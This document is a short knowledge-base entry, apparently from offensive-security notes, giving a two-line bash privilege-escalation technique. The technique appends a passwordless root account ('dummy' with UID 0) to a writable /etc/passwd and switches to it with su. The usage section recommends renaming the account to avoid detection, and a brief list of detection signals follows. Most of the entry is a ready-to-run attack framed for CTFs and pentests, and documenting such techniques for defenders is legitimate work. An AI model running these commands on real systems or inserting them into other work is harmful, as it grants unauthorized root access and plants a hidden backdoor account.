---
type: code
language: bash
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - privesc
  - account-creation
validated: true
---

# add-dummy-root-user-and-switch

## Code

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

## Description

This short script adds a passwordless root user to /etc/passwd and immediately switches to it, providing instant privilege escalation on writable systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| dummy | Username | dummy |
| :: | Empty password | N/A |
| 0:0 | Root UID/GID | N/A |
| /root:/bin/bash | Home and shell | N/A |

## Usage

Execute in a low-priv shell where /etc/passwd is writable. The first line appends the user; the second su's without password. Use for quick root access in CTFs or pentests; change 'dummy' to avoid detection.

## Detection

- File integrity monitoring on /etc/passwd for appends with empty password fields.
- Audit logs for su without password prompts.
- Process chaining: echo followed by su in non-interactive sessions.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-passwd]]
- [[commands/add-dummy-user-to-etc-passwd]]
